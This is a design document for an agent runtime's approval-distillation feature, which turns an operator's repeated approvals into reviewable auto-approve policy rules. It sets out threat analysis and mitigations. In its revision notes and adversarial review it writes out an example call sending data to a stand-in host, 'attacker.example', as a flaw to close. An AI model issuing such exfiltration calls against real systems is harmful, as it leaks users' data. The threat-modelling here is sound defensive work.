# Design: approval distillation, the ledger becomes policy (item 251)

Status: design proposed. No implementation. This doc decides the shape key a
repeated approval is detected by, the typed policy diff that distillation emits
(a rule an operator could have written by hand, checked on the same path), the
blast-radius fold and its negative guarantee, the review/apply/revoke/attribute
flow through the item-55 operator surface, the soundness statement against the
G-invariants, and a sliced implementation plan whose first slice lands alone.

Item 251 needs 246 (auto-approve, landed H3), 248 (the measurement substrate,
the approval WAL and `approval_metrics`), 249 (taint origins), 33 (the boundary
policy language), 55 (operator capabilities), and 344/379 (session-scoped
standing grants and their early revoke, the runtime consume path this reuses).
It registers one new row in the 414 reach-completeness harness, the row item
274 slice 2 reserved for it.

## Revision (adversarial review 2026-08-31)

An independent review after the author self-review (§6) found one new CRITICAL,
two HIGHs, and a MEDIUM. This revision folds all four in. The changes, and where
each is now closed:

  * **N1 (new CRITICAL): the destination was not in the shape key.** A crossing
    capability was recorded BARE. `_classify_direct` builds
    `{"kind":"emission","key":fact["key"]}` and `build_ticket` sets
    `classCCapabilities = sorted(reach["classC"])`, both bare dotted tokens. The
    runtime destination (`host=` / `path=` / `table=`) lived ONLY inside
    `argsDigest`, a hash the shape key deliberately excludes, so
    `gateway.send(host="attacker.example", body=<literal>)` (a hardcoded host,
    no taint) bucketed identically to five sends to `api.stripe.com`, passed the
    `{} subset {}` taint gate, and auto-approved silently. This violated S1:
    `cap_order._REGISTRY` registers `host` as a narrowable resource param, so an
    operator CAN hand-write `gateway.send(host="api.stripe.com")`, but the old
    distiller could only emit the strictly WIDER host-free rule. **Closed** by
    making the shape key carry the resource scope
    (`capability_token_with_resource_params`, §1.2), binding the runtime resource
    args into the crossing capability at ticket time and recording the bound
    resource valuation in the ledger (§2.1, §7 Slice 2), and refusing to distill
    when observed grants span resource values with no expressible common cone
    (§1.3). The 414 blast-radius fold could not have caught it (a destination is
    not a crossing KIND) and the old render could not even enumerate the hosts
    (it held only arg-hashes); both now operate on structured resource targets.

  * **H1 (HIGH): suspend-on-change missed open-world glob membership.** A1's
    suspend signature watched the candidate-hash set and re-folded on a SWAP, but
    rule matching is `fnmatchcase` over a GLOB (`Rule.selects`). A newly authored
    or renamed component entering `billing:*` was auto-approved with no prompt and
    no re-review because it was not a swap of any watched hash. **Closed** (§6 A1)
    by binding the rule to the enumerated component set it was distilled from and
    treating glob-membership GROWTH as a signature change: any component entering
    the glob selection that was not in the reviewed blast set suspends the rule
    and re-offers, fail-closed.

  * **H2 (HIGH): the taint tier-gate was on RECORDING, not ENFORCEMENT.**
    Refusing to distill taint-relevant shapes on static-only tiers closed the
    distill path, but a rule distilled on a hosted tier persists; if the same
    component later ENFORCES on a tier without runtime value taint, the admission
    `taintOrigins` had no honest source. **Closed** (§2.2, §6 A2) by stating that
    at admission the taint-subset gate uses the STATIC over-approximation as its
    floor on any tier lacking post-endorsement runtime taint (over-prompt is
    safe), NEVER an empty or unknown default: `taintOrigins` unknown at admission
    is treated as ALL origins present (fail-closed), not none. The enforcement-
    tier case is registered in the 414 taint cells so a tier yielding an empty
    taint set at admission for a taint-relevant rule reds the differential.

  * **M1 (MEDIUM): six origins claimed, five enforced.** `_ORIGIN_CLASSES` has
    six origins including `secret`, but the item-249 taint fold enforces five
    `{web, net, fs, input, model}` (`test_taint_fold_visits_every_in_scope_kind`)
    and `secret` is enforced by the separate G-SECRET mechanism (item 256), a
    REFUSAL at the crossing, not a recorded origin. **Closed** (§2.1, §3.2) by
    making the honest choice: `secret` is NEVER `admit`-able by any rule. It is
    structurally excluded, not one of six symmetric `admitting` origins. The
    `admitting` set ranges over exactly the five taint-fold origins; the render
    sources the `secret` line from the G-SECRET mechanism and states no rule can
    ever admit it. The 414 taint row stays at five.

**The corrected S1 invariant.** A distilled rule is expressible by hand BECAUSE
the shape key carries the resource scope, or it refuses to distill. Where a
capability exposes a resource param in `cap_order._REGISTRY` (`host`, `path`,
`table`), the emitted rule names the resource scope actually crossed
(`gateway.send(host="api.stripe.com")`), which is a rule an operator could type;
where the observed grants span resource values with no expressible common cone,
the distiller REFUSES with a typed reason rather than emit the wider host-free
rule no operator narrowing produced. Distillation can still only select text an
operator could have written, never widen past it.

## The one thing to get right

**A distilled rule is a rule an operator could have typed, and nothing more.**
Distillation is a text generator with a review gate in front of it. It reads
the approval ledger, notices that the same operator keeps saying yes to the
same shape of crossing session after session, and writes down the policy rule
that would have said yes for them. It does not invent a new kind of authority,
it does not evaluate on a privileged path, and it never applies itself. Delete
the distiller entirely and every rule it ever produced is still expressible in
the item-33 policy language and still checked by the same evaluator. The whole
product is the selection plus the blast radius plus the review, not a new grant
mechanism. The moment a distilled rule can admit a crossing that a hand-written
rule of the same text could not, the differentiating claim dies, because then
distillation is a laundering path and not a convenience.

The second half: **the residue trends toward the floor across sessions, not
within one.** Item 344 already took the shell-escape shape (n identical
crossings this session) from n prompts to one mint. That mint resets at session
end by design (invariant 5). The prompts that 251 targets are the ones that
survive the reset: the recurring operator decision, re-made every session,
because the consent it encodes is session-scoped and the decision is not.
Distillation promotes that recurring decision to policy, which persists, so
item 248's prompts-per-session metric stops resetting and starts converging on
the irreducible count of genuinely novel decisions.

## 1. Detecting a repeated approval shape

### 1.1 The substrate

The ledger is item 248's measurement substrate: the append-only WAL stream of
`approval-granted` records (`backends/python/replay.py`
`record_approval_granted`), one per human yes, from all three grant sites (the
operator-layer ticket `Session.approve_ticket`, the language surface
`grant_language_approval`, and the item-344 standing-grant mint). Each record
already carries the ticket fields (`src/revl/mcp/approval.py` `build_ticket`):
`capability`, `candidateHash`, `component`, `session`, and the human-visible
`capabilities`, `crossings`, `argsDigest`, `classCCapabilities`. The
`approval-consumed` and `approval-revoked` records complete the life of each
grant. This is a fact stream about consent, and distillation is a pure fold
over it.

### 1.2 The shape key

The shape key is deliberately **exactly the tuple an item-33 rule scopes over**,
because the distilled rule must be expressible in that language and no other.
For a granted class-(c) crossing it is:

    shape_key = (capability_token_with_resource_params, realm, taint_origin_set)

  * **capability_token_with_resource_params** is one entry of
    `classCCapabilities`, never the worst-class `capabilities` fold, **carrying
    the resource scope actually crossed**. One shape key, and therefore one
    candidate rule, per class-(c) capability actually crossed, inheriting the
    245/246-F1 fix that requires every class-(c) capability covered rather than
    the worst over the closure.

    The token alone is not enough, and this is the N1 CRITICAL. `_classify_direct`
    records an emission crossing bare (`caps.add(fact["key"])`,
    `class_c.add(fact["key"])`, a dotted token), and the runtime destination
    (`host=` / `path=` / `table=`) lives ONLY in `argsDigest`, a hash the shape
    key excludes. So a class-(c) `gateway.send(host="attacker.example")` with a
    hardcoded host and no taint buckets identically to sends to
    `api.stripe.com`, passes the `{} subset {}` taint gate, and auto-approves
    silently. `cap_order._REGISTRY` registers `host`, `path`, and `table` as
    resource-kind params (an operator CAN hand-write
    `gateway.send(host="api.stripe.com")`), so a token-only key emits the
    strictly WIDER host-free rule no operator narrowing produced, violating S1.

    So for any capability whose `_REGISTRY` entry exposes a resource param, the
    shape key and the emitted rule carry the resource valuation of the crossing:
    the projection `gateway.send(host="api.stripe.com")`, `fs.write(path="/var/spool")`,
    `db.write(table="ledger")`. The projection is the registered-resource subset
    of the bound crossing, canonicalized through `cap_order.Cap` and ordered by
    `covers`, so two distinct hosts do not collapse and a `path=` prefix that
    `covers` orders is the only join two path values share. A capability with no
    `_REGISTRY` resource param (a bare token) keys exactly as before, byte-for-
    byte, additively. See §1.3 for the multi-value join-or-refuse rule and §2.1
    for where the runtime resource args are bound into the token.
  * **realm** is `policy.component_realms(manifest, component)` for the crossing
    component: the realm it is isolated into, or the shared realm as its own
    bucket. This is the item-33 `realm <name>` scope, verbatim.
  * **taint_origin_set** is the set of item-249 taint-fold origins the crossing's
    argument values carried at the grant, over the **five** origins the fold
    enforces (`web`, `net`, `fs`, `model`, `input`), which is exactly
    `_SOURCE_CLASS_SCOPES` and exactly what `test_taint_fold_visits_every_in_scope_kind`
    asserts. `secret` is deliberately NOT one of these: `_ORIGIN_CLASSES` lists
    it, but it is enforced by the separate G-SECRET mechanism (item 256) as a
    REFUSAL at the crossing, never a recorded origin, so it can never appear in a
    `taintOrigins` set and is never `admit`-able by a rule (§2.1, §3.2). This is
    the dimension the ticket does not record today, and §6 A2 shows why it must
    be a recorded runtime fact and not a re-derivation. Slice 2 extends
    `record_approval_granted` with a `taintOrigins` field read from the hosted-
    tier post-endorsement runtime taint of the crossing arguments.

Deliberately **not** in the key:

  * **argsDigest** generalizes away. A rule that only auto-approved one argument
    value would be a cache, not a policy. But the set of distinct `argsDigest`
    values seen for a key is recorded as recurrence evidence: the same shape with
    varying args is a repeated decision, one arg retried is not.
  * **candidateHash** generalizes away. A persistent policy rule survives swaps,
    exactly as every hand-written item-33 rule does, so it cannot bind a frozen
    candidate hash the way a session-scoped 344 grant does. The set of candidate
    hashes seen is recorded for the blast-radius provenance and for the
    swap-widening mitigation (§5 S3, §6 A1).

### 1.3 The trigger

An offer is minted for a shape key when, over a bounded ledger window:

  * at least **N grants** (default 5) carry the key, and
  * they span at least **M distinct sessions** (default 2), so a within-session
    repetition, which item 344 already handles, never by itself triggers a
    persistent policy change, and
  * **every** grant is attributed to the **same operator identity** (item 55),
    because a distilled rule inherits that operator's authority and a
    mixed-operator shape has no single author (refused; offered as per-operator
    sub-distillations instead), and
  * there is **zero denial** of the same shape key in the window: a shape the
    operator sometimes refuses is not a settled decision, and distilling it
    would encode a coin-flip as a standing yes, and

  * for a capability that HAS a `_REGISTRY` resource order, the distinct resource
    values observed across the grouped grants **join to a single expressible
    cone**. Grants to one host, or under one `path=` prefix that `covers` orders,
    emit that scope. Grants spanning distinct hosts (or distinct tables, or
    sibling path cones with no common ancestor other than the bare token) have no
    single scope an operator could narrow to, so the distiller **refuses** with a
    typed reason (`"varying host, no single scope"`), exactly as a mixed-operator
    shape is refused. It never widens two distinct targets to the host-free rule.
    This is the N1 fix as a trigger clause: fail closed on an unbounded target
    set for a capability that has a resource order, rather than distill the wider
    rule. A bare-token capability with no resource order is unaffected.

The distiller is pure and its "cannot distill" verdict is a first-class result,
in the discipline item 252 set for its shell classifier, never a silent
fallthrough. A shape that fails any clause returns a typed reason (too few
sessions, mixed operators, a denial present, taint unavailable on this tier, a
resource scope unrecorded, varying resource values with no common cone), which
is what the operator sees instead of an offer.

## 2. The typed policy diff

### 2.1 The rule form

A distilled rule is a new item-33 policy rule, `AutoApproveRule`, added to
`policy.py` beside `Rule`, `ApprovalRule`, and `TaintFlowRule`. Its DSL form,
writable by hand:

    component <glob> may auto-approve <cap>[, <cap> ...]
        [in realm <name>]
        [admitting <origin>-taint[, <origin>-taint ...]]
        [ttl <D>] [uses <N>]

Each `<cap>` is an item-294 capability spelling, so it may carry a resource
scope (`gateway.send(host="api.stripe.com")`, `fs.write(path="/var/spool")`),
parsed and ordered by `cap_order`, and `<origin>` ranges over the five taint-fold
origins only (`web`, `net`, `fs`, `model`, `input`); `secret` is not accepted.

The minimal form the distiller emits for the shape in §1.2, with an untainted
observed taint set and a single observed resource value, is:

    component billing:* may auto-approve gateway.send(host="api.stripe.com") in realm billing

which reads: a class-(c) `gateway.send` crossing **to host `api.stripe.com`**
from a `billing:*` component isolated into realm `billing`, carrying **no** taint
origin, is auto-approved (its posture becomes a policy-covered pass, counted
apart from `silent`) instead of raising a ticket. The `host="api.stripe.com"`
scope is the N1 fix: because `cap_order._REGISTRY` marks `host` a resource param,
the rule names the destination and cannot auto-approve a send to any other host,
exactly as a hand-written narrowing would (and exactly as the runtime
`_cap_covers`/`covers` order enforces). A capability with no `_REGISTRY` resource
param emits the bare token as before.

Every origin the rule does not explicitly `admit` is excluded, so the negative
guarantee (§3.2) is the default and holds for the five taint-fold origins `web`,
`net`, `fs`, `model`, and `input` unless named. `secret` is **not** an
`admitting` origin at all: a bound-secret crossing is refused by G-SECRET (item
256) at the crossing regardless of any rule, so no `AutoApproveRule` can ever
admit `secret`, and the parser rejects `admitting secret-taint` rather than
silently accept an origin the gate structurally excludes.

### 2.2 Why it is exactly as checkable as a hand-written rule

The rule plugs into the runtime consent path item 344 already built, not a new
one. `AutoApproveRule` is loaded by the `Session` where `_grants` are loaded,
except its source is the policy file rather than a runtime mint, and it is
matched in `_find_standing_grant` (or a sibling that shares its body) with two
additions over a 344 grant:

  * it is scoped by a **component glob + realm + capability (with its resource
    scope)**, evaluated with the same `Rule.selects` / `fnmatchcase` machinery
    every item-33 rule uses for the glob and the same `cap_order.covers` order
    (`_cap_covers`) every 344 grant uses for the capability, rather than by a
    single component and a frozen candidate hash. The live crossing's bound
    resource valuation must be **covered** by the rule's capability scope, so a
    rule spelling `host="api.stripe.com"` never admits a send to another host,
    and
  * the crossing's `taintOrigins` must be a **subset** of the rule's `admitting`
    set (default empty), a hard predicate over the five item-249 taint-fold
    tokens, checkable statically against the `taint:<component>:<origin>` audit
    tokens and dynamically against hosted-tier runtime taint.

**The taint gate at admission is on the tier that ENFORCES, not the one that
recorded (H2).** A rule distilled on a hosted tier persists and may later admit
on a component running on a tier without post-endorsement runtime value taint.
The recording-time refusal (§6 A2) closes only the distill path; it does not
supply the live crossing's `taintOrigins` at admission. So the subset gate uses
the item-249 **static over-approximation as its floor** on any tier lacking
runtime taint: `taintOrigins` unknown or unavailable at admission is treated as
**ALL five origins present** (fail-closed, over-prompt is safe), NEVER as an
empty or unknown default that a `{} subset admitting` test would wave through.
For a taint-relevant rule (nonempty `admitting`, or a capability that can carry
taint), an empty admission-time taint set is impossible by construction: the gate
substitutes the static floor. §3.3 registers this enforcement-tier case in the
414 taint cells so a tier that yields an empty set at admission reds the
differential.

There is no distiller-privileged evaluation. An operator who types the rule and
an operator who accepts a distilled offer of the identical text get a
byte-identical runtime enforcement. The distiller only selects the text.

## 3. Blast radius

### 3.1 The fold

Before the operator reviews, the distiller computes the blast radius by
replaying the ledger window and asking, for a candidate rule, "would this rule
have auto-approved this grant?" using the **same predicate the runtime consent
path uses**, not a re-implementation. It reuses `policy.component_reach` and the
`ClassMap` closure fold to enumerate the crossings of each ledger entry, and the
`_grant_within` / taint-subset check to decide coverage. The output partitions
the window:

  * the grants the rule **would have covered** (the auto-approved count),
  * the grants it **would not have**, each with the reason it fell out (a taint
    origin the rule excludes, a realm out of scope, a capability outside the
    glob, **a resource value outside the rule's scope**).

Because the ledger now records the bound resource valuation of each crossing
(§2.1, §7 Slice 2) rather than only an opaque `argsDigest`, the fold groups the
window by resource value and the render enumerates the distinct destinations
seen (the hosts, path cones, or tables), which the old hash-only ledger could
not. This is what makes the N1 resource scope reviewable and the join-or-refuse
verdict (§1.3) legible to the operator.

### 3.2 The rendering and the negative guarantee

The rendering states the positive count and then **enumerates every origin the
rule can never admit**, which is the negative guarantee:

    This rule would have auto-approved 14 of the last 20 gateway.send prompts
    from billing:* in realm billing, all to host api.stripe.com. It would not
    have covered 6: 4 carried web-taint, 2 crossed from realm ops (out of scope).
    It can never approve a send to any other host, and can never approve an
    emission carrying web-taint, net-taint, fs-taint, model-taint, or input-taint
    (admitted origins: none; untainted only). A bound-secret crossing is refused
    by G-SECRET at the crossing and cannot be auto-approved by any rule.

The negative guarantee is not prose, it is the complement of the rule's
`admitting` set over the **five** item-249 taint-fold origins, plus the resource
scope the rule names, computed from the same tables that enforce it. "Can never
approve web-taint" is true iff the taint-subset gate sees web-taint on every
crossing kind that can carry it, which is why §6 A2 makes `taintOrigins` a
recorded runtime fact and §3.3 makes the fold a 414 row. The `secret` line is
not one of five symmetric admitting origins: it is sourced from the separate
G-SECRET mechanism (item 256), which refuses a bound-secret crossing structurally,
so the render states it as an absolute rather than as an un-admitted origin.

### 3.3 Registration as a 414 reach-completeness row

The blast-radius fold is an authority-derivation surface: it enumerates which
crossings a candidate rule admits, and an operator approves the rule believing
that enumeration is complete. A fold that visits only some crossing kinds (a
`req` service call but not a spawn / instance-get emission, or a capability but
not a resource nested in a record / variant / generic, or a first-class
emitting callable, or a `*` widening) **understates** what the rule admits: the
operator approves believing the blast is 14, and the rule silently also admits a
spawn crossing the fold never showed. This is the shape of every CRITICAL the
2026-08-31 campaign found, a reach fold that visits one crossing kind and misses
another.

Item 274 slice 2 reserved this: "the 251 blast-radius fold registered as a 414
reach-completeness row." So `tests/test_reach_completeness.py` gains a SURFACES
row, "the 251 blast-radius fold", crossed against every `CROSSING_KINDS` entry,
each cell a with/without differential so a fold that stops visiting a kind goes
red, and any future seventh crossing kind must extend this row or fail the
totality meta-test. The fold reuses `component_reach` plus the `ClassMap`
closure precisely so it visits the same kinds those surfaces already do, rather
than a bespoke re-walk that could drift.

Two additions land in this row from the revision. First, the **taint cells**
carry an enforcement-tier variant (H2): a taint-relevant rule admitting on a tier
without post-endorsement runtime taint must see the static floor (all five
origins), so a fixture where the admission taint set comes back **empty** for a
taint-relevant crossing reds the differential, proving the floor substitution is
wired and not defaulting to `{}`. Second, the fold operates on the **bound
resource valuation** (§2.1), not `argsDigest`, so a crossing that carries a
`_REGISTRY` resource param but reaches the fold without its resource scope
projected is a visible red, not a silent bare-token match; this is the surface
the N1 CRITICAL slipped through when the destination lived only in the hash.

## 4. Review, apply, revoke, attribute (item 55)

Distillation surfaces as MCP operator verbs, gated exactly as the item-344 mint
and item-379 revoke are:

  * **`session.distillation_offers()`** is read-only: it folds the ledger and
    returns the candidate `AutoApproveRule` text, each with its blast radius,
    its attributed operator, and the sessions it was distilled from. It proposes
    and does not apply, so it is ungated for reading, but it is scoped to the
    caller's own grants: an operator sees offers distilled only from yeses
    attributed to them.
  * **`session.apply_distillation(offerId)`** is gated by the item-55 `approve`
    verb, because installing a standing auto-approve is the same authority as
    granting the underlying yeses. It writes the `AutoApproveRule` into the live
    policy and patches the policy file (the audited operator surface), and
    records a `distillation-applied` WAL fact naming the operator, the rule
    text, the blast-radius snapshot, and the ledger window. It carries the same
    ambiguity refusal `mint_standing_grant` and `revoke_standing_grant` have: a
    capability reachable via more than one closure is refused rather than
    silently scoped.
  * **`session.revoke_distillation(ruleId)`** reuses the item-379 revoke shape:
    it removes the rule, records `distillation-revoked`, and the next matching
    crossing prompts again (fail-closed). Consume-before-fire already covers any
    in-flight crossing, so there is no orphaned auto-approval mid-revoke.

**Attribution.** Every distilled rule carries `distilledBy` (the operator whose
repeated yeses it encodes), `distilledFrom` (the ledger window and grant ids),
`reviewedBy` (the operator who applied it, recorded separately when different),
and `appliedAt`. It lands in the item-27 causal trace with who, exactly as item
55 requires of every management action, so "what auto-approved this crossing and
on whose authority" is one query that resolves through the rule to the operator
and to the original yeses.

**The time axis.** `approval_metrics` today returns a single-session snapshot
(`promptsPerSession`, `grantsConsumed`, `standingGrants`). Item 251 adds a
persisted per-session series read from the WAL, and a `distillationImpact`
field showing prompts-per-session before and after each applied rule. The floor
is computable, not rhetorical: it is the count of shape keys that cannot be
distilled (seen in one session, mixed-operator, ambiguous, taint-varying, or
spanning resource values with no common cone).
The series trending to that floor is the item-248 headline claim made
measurable over time.

## 5. Soundness against the G-invariants

A distilled rule must never widen authority beyond what the operator could have
written by hand. Precisely:

  * **S1, convenience not a grant path.** Every `AutoApproveRule` the distiller
    emits is syntactically a rule an operator could type, enforced on the same
    runtime path as a hand-written one (§2.2). The distiller selects text, the
    operator reviews and applies through the item-55 gate, the runtime enforces.
    Remove the distiller and every rule it produced is still expressible and
    still checked. This is the invariant the whole design serves. The N1 revision
    makes it exact on the resource axis: a distilled rule is expressible by hand
    BECAUSE the shape key carries the resource scope
    (`gateway.send(host="api.stripe.com")`, a narrowing an operator could type),
    or the distiller REFUSES (varying resource values with no common cone, §1.3).
    It never emits the wider host-free rule that no operator narrowing produced,
    which was the laundering path the token-only key opened.
  * **S2, strictly weaker than the prompt it replaces.** Auto-approve never
    overrides an item-246 `requires approval` floor, an item-33 `may not reach`
    deny, or an item-249 taint-flow refusal. It only converts a prompt that was
    already going to be offered (a crossing that already passed every deny,
    taint, and floor check and reached the human) into a policy-covered pass.
    Formally: for any crossing X, `admit(policy + rule, X)` implies X was a
    class-(c) prompt the operator could have said yes to, never a crossing a
    prompt could not have admitted. The rule automates a yes that was already
    reachable, and can reach nothing new.
  * **S3, per-generation re-evaluation in place of the candidate-hash bind.** A
    344 grant self-invalidates on any swap via its candidate hash (invariant 4).
    A 251 rule must persist across swaps, so it gives up that bind and is instead
    re-evaluated against the live audit graph at each admission, exactly as every
    item-33 rule is. Persistence across swaps is the whole point, and it reopens
    the swap-widening surface, which §6 A1 addresses with suspend-on-signature-
    change. The residual (a swap that changes behavior without changing the
    crossing signature) is the standing G8 caveat, identical for a hand-written
    rule, so S1 holds: 251 is exactly as capable and no more.

## 6. Adversarial self-review

Every prior design review on this arc found a CRITICAL. Here is mine, first,
then the one the independent 2026-08-31 review found beyond it (N1).

### N1 (CRITICAL, independent review): the destination is not in the shape key

The self-review missed it. A crossing capability is recorded BARE:
`_classify_direct` builds `{"kind":"emission","key":fact["key"]}` and
`build_ticket` sets `classCCapabilities = sorted(reach["classC"])`, both bare
dotted tokens. The runtime destination (`host=` / `path=` / `table=`) lives ONLY
in `argsDigest`, a hash the shape key deliberately excludes. So a hardcoded
`gateway.send(host="attacker.example", body=<literal>)` with no taint buckets to
the same shape key as five sends to `api.stripe.com`, passes the `{} subset {}`
taint gate, and auto-approves silently, to an attacker-chosen host, under a rule
whose whole point is that the operator vetted the destination. This violates S1:
`cap_order._REGISTRY` registers `host` a narrowable resource param, so an
operator CAN hand-write `gateway.send(host="api.stripe.com")`, but the token-only
distiller can only emit the strictly WIDER host-free rule, an authority no
operator narrowing produced. The A3 blast-radius 414 row does not catch it (a
destination is not a crossing KIND), and the render could not even enumerate the
hosts (it held only arg-hashes).

Mitigation, three parts. (1) The shape key becomes
`(capability_token_with_resource_params, realm, taint_origin_set)`: for any
capability whose `_REGISTRY` entry exposes a resource param, the emitted rule
carries the resource scope, `gateway.send(host="api.stripe.com")` (§1.2, §2.1).
(2) Slice 2's `record_approval_granted` records, alongside `taintOrigins`, the
BOUND RESOURCE VALUATION of the crossing (the registered-resource projection: the
`host=` / `path=` / `table=` values actually crossed), captured post-endorsement,
NOT the whole `argsDigest`, just the registered-resource projection. This
requires `_classify_direct` / `build_ticket` to bind the runtime resource args
into the crossing capability (turn bare `gateway.send` into
`gateway.send(host="api.stripe.com")` at ticket time) so the ledger carries
structured targets, not a hash (§7 Slice 2). (3) If observed grants span multiple
distinct resource values, the distiller emits the join only if it is an
expressible cone (a common `path=` prefix that `covers` orders), else REFUSES
with a typed reason (`"varying host, no single scope"`), exactly as mixed-operator
is refused (§1.3). It fails closed on an unbounded target set for a capability
that HAS a resource order. Status: closed for the enumerable surface; a
capability with no `_REGISTRY` resource order keys and distills exactly as before.

### A2 (CRITICAL): the taint dimension the shape key mis-buckets, and the negative guarantee becomes a lie

The headline the operator reads is "can never approve an emission carrying
web-taint." If the shape key's taint dimension is reconstructed at distill time
from the static audit rather than recorded per grant, the guarantee is
unsound. The item-249 static taint walk is an over-approximation, and, worse,
declassification is legitimate: a grant can occur while the crossing's argument
carried `web`-taint upstream that was `endorse`d before the sink, so the sink
itself saw untainted. Reconstructing "was this untainted" after the fact cannot
distinguish "never tainted" from "tainted then endorsed at a site that this
future candidate may no longer contain." Two grants that look identically
untainted at distill time can differ in whether the untaintedness was intrinsic
or earned by an endorsement the next swap removes. The distilled rule then
auto-approves a future `gateway.send` where the endorsement is gone and web
content reaches the wire, silently, under a rule whose rendered guarantee said
this was impossible. This is the lethal-trifecta exfiltration edge item 249
exists to close, re-opened by a measurement artifact.

Mitigation. The taint origin set is a **recorded runtime fact**, not a
re-derivation. Slice 2 extends `record_approval_granted` with `taintOrigins`
read from the hosted-tier runtime taint of the crossing arguments **at the sink**
(post-endorsement, the value that actually crossed), so the shape key buckets on
what reached the boundary, not on an after-the-fact static guess. The distilled
rule's `admitting` set defaults to exactly the observed set (usually empty) and
the taint-subset gate is fail-closed: any origin not admitted falls through to a
prompt. On tiers without runtime value taint (ownerless / static-only), the
distiller **refuses to distill a taint-relevant shape** at all, because the
static over-approximation cannot ground the negative guarantee, and returns
that as its typed "cannot distill" reason. The taint gate is registered in the
414 row so it must visit every crossing kind's argument positions.

The H2 corollary is on the ENFORCEMENT side, not the recording side. The refusal
above closes only the distill path; a rule distilled on a hosted tier is
persistent and may later admit on a component running on a tier without post-
endorsement runtime value taint, where the live crossing's `taintOrigins` has no
runtime source. That gate must NOT default to an empty or unknown set, or
`{} subset admitting` waves the crossing through under a guarantee grounded on a
different tier. So at admission the taint-subset gate uses the item-249 **static
over-approximation as its floor** on any tier lacking runtime taint: unknown or
unavailable `taintOrigins` is treated as **ALL five origins present**
(fail-closed, over-prompt is safe), never as none. §2.2 states the rule and §3.3
registers the enforcement-tier case in the 414 taint cells (an empty admission
taint set for a taint-relevant crossing reds the differential), so the floor
substitution cannot silently rot.

Residual: the recorded taint is only as honest as the extern classification
that produced it (the standing G8 caveat, a lying `pure`/untainted extern lies
about taint here too). This is not new to 251 and the rendered guarantee inherits
the G8 disclaimer item 33's policy report already carries. Status: mitigated for
the enumerable surface; the G8 residual is disclosed, not closed.

### A1 (CRITICAL-class): the swap-widened rule

A distilled rule is re-evaluated per generation (S3), not bound to the candidate
it was distilled from. An operator swaps `billing:*` to a candidate that reaches
`gateway.send` with a different, more dangerous closure (a new endpoint under
the same capability token, or an argument now built from a fresh source). The
rule auto-approves it silently, because the rule text did not change and so the
operator never re-reviews, yet the blast radius they approved was computed over
the old candidate and never contained this crossing. Same shape as A2 across the
time and swap axis: a gate frozen at one point admitting a crossing kind it never
visited.

Mitigation. A distilled rule records the crossing signature it covered (the
sorted crossings plus the taint profile plus the bound resource valuation), the
candidate-hash set it was distilled from, **and the enumerated set of components
that were selected by its glob in the reviewed blast set**. At each swap, the
distiller re-folds the rule against the new candidate; if the covered crossing
signature **changes** (a new crossing kind, a new endpoint token, a new resource
value, a taint origin now in scope), the rule is **suspended and re-offered for
review**, fail-closed, never silently carried.

The open-world glob is the H1 hole and it is part of the signature. Rule matching
is `fnmatchcase` over a glob (`Rule.selects`), so a newly authored or renamed
component matching `billing:*` is not a swap of any watched candidate hash and
would slip past a hash-only suspend signature with no prompt and no re-review.
So the suspend signature includes **the set of components currently selected by
the glob** (and their candidate hashes), and any component entering the glob
selection that was **not in the reviewed blast set** is treated as a signature
change: the rule suspends and re-offers, fail-closed. Glob-membership GROWTH is a
signature change, so the rule is bound to the enumerated component set it was
distilled from, not to the open glob. This makes the per-generation re-evaluation
re-review both the swap delta and the membership delta. The swap / spawn
crossing-kind cells of the 414 row assert the re-fold visits crossings a swap can
introduce; a membership-growth fixture asserts a new glob member suspends.
Residual: a swap that changes behavior without changing the crossing signature
(same capability, endpoint token, resource value, membership, and taint, but the
code now does something worse) is invisible to a reach-scoped rule, exactly as it
is to a hand-written item-33 rule (the G8 boundary). OPEN, and bounded to be no
worse than the hand-written case, which S1 requires.

### A3: the blast-radius fold understating the blast

The fold enumerates the past prompts a rule admits but visits only `req`
service-call crossings, missing spawn / instance-get emissions or a resource
nested in a record / variant / generic. The operator sees "admits 14/20,"
approves, and the rule silently admits a spawn crossing the fold never counted.
Mitigation: the fold reuses `component_reach` plus the `ClassMap` closure fold,
never a bespoke re-walk, and is a registered 414 SURFACES row so a fold that
stops visiting a crossing kind reds the with/without differential (§3.3). Status:
mitigated by construction.

### A4: the poisoned or replayed ledger

An attacker who can append or replay WAL records manufactures N grants of a
dangerous shape to force an offer, or aims for an auto-apply. Mitigation:
distillation **never auto-applies**, it only offers, so a poisoned ledger yields
at most a bad offer that the operator's review is built to catch, showing the
actual crossings, the attributed operator, and the exact sessions. Ledger
records are session-bound (invariant 5) and the distiller counts only grants in
genuinely distinct sessions attributed to a real operator identity; a replayed
record carries a stale `session_id` the WAL replay guard already rejects.
Status: mitigated. Residual OPEN: a compromised operator identity that
legitimately grants N dangerous yeses then distills them, which is an
operator-compromise and not a distillation hole, and the distilled rule is
exactly as bad as the N yeses already were with no amplification, now auditable
and revocable through attribution.

### A5: attribution and revocation gaps

(a) A distilled rule outlives the operator who made it (profile rotated or
scope narrowed) and keeps auto-approving on departed authority. Mitigation: the
rule's authority is re-validated against the live operator profile at admission;
if the attributed operator no longer holds `approve` for that capability and
realm, the rule is suspended, fail-closed. (b) Revoke must be as immediate as a
379 grant revoke with no orphaned in-flight auto-approval, which consume-before-
fire covers. (c) A shape whose underlying yeses span more than one operator has
no single author; the distiller refuses it and offers per-operator
sub-distillations, so a rule never carries an authority no single operator held.
Status: mitigated.

## 7. Implementation plan

Ordered, first slice landable alone.

### Slice 1, the pure distiller and the typed diff (no runtime change, lands first)

  * `src/revl/policy.py`: add the `AutoApproveRule` dataclass and its DSL / JSON
    parse (`component <glob> may auto-approve <caps> [in realm <r>] [admitting
    <origin>-taint,...] [ttl D] [uses N]`), added to `Policy`. Parse-only here,
    no evaluation wiring, so the policy round-trips a hand-written rule.
  * `src/revl/distill.py` (new, pure): read a list of `approval-granted` records,
    project each to the **resource-scoped** shape key (§1.2), threshold (§1.3)
    including the resource join-or-refuse clause, and emit candidate
    `AutoApproveRule` text carrying the resource scope. The shape-key projection
    reads each capability's `_REGISTRY` entry (via `cap_order`) to know which
    tokens carry a resource order, and reads the recorded resource valuation from
    the record; keying is on the resource-scoped shape from the start. The
    blast-radius fold (§3), reusing `component_reach` and the `ClassMap` closure,
    returns the covered / not-covered partition and the negative-guarantee origin
    complement. The "cannot distill" verdict is a first-class typed result.
  * `tests/test_reach_completeness.py`: register "the 251 blast-radius fold" as a
    SURFACES row crossed against every `CROSSING_KINDS` entry (the 274-slice-2
    hook), each cell a with/without differential; include the resource-scope cell
    (a `_REGISTRY` resource crossing reaching the fold un-projected reds) and the
    enforcement-tier taint cell (an empty admission taint set for a taint-relevant
    crossing reds, §3.3).

